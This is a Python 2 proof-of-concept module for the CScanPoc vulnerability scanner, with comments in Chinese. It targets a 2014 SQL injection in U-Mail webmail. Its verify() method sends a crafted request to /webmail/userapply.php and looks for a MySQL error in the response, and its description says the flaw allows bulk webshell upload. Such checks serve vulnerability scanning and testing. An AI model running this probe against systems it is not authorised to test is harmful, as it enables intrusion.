# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'U-Mail_0001' # 平台漏洞编号，留空
    name = 'U-Mail邮件系统 SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-3-11'  # 漏洞公布时间
    desc = '''
        u-mail中某个文件由于参数过滤不严谨导致产生了SQL注入，通过此漏洞可以将shell写入到web目录下，可批量getshell.
    '''  # 漏洞描述
    ref = 'https://www.unhonker.com/bug/1513.html'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'U-Mail'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'ce4de019-3543-4001-8fb8-b155138026af'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = '/webmail/userapply.php?execadd=333&DomainID=111'
            verify_url = self.target + payload
            r = requests.get(verify_url)

            if r.status_code == 200 and re.search('MySQL result resource in <b>([^<]+)</b>', r.text):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
